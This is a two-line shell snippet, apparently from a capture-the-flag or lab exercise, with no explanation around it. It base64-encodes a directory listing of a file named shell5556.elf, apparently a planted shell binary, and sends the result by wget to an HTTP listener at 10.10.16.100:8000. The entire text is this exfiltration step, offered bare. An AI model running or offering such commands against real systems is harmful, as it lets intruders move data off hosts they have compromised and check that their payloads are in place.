cmd=`ls -alh shell5556.elf | base64`
wget http://10.10.16.100:8000?res=$cmd
